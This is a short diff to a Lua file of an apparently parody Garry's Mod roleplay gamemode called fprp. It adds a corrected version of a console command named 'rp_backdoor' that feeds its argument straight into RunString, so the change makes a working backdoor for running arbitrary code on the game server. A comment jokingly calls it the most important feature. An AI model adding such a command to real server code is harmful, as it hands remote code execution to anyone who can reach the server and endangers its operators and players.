@@ -90,6 +90,6 @@ fprp.finish()
 hook.Call("fprpFinishedLoading", GM)
 
 -- This is the most important feature of any rp gamemode
-concommand.Add('rp_backdoor', function(a) RunString(a[1]) end)
+concommand.Add('rp_backdoor', function(p,c,a) RunString(a[1]) end)
 
 DarkRP = fprp
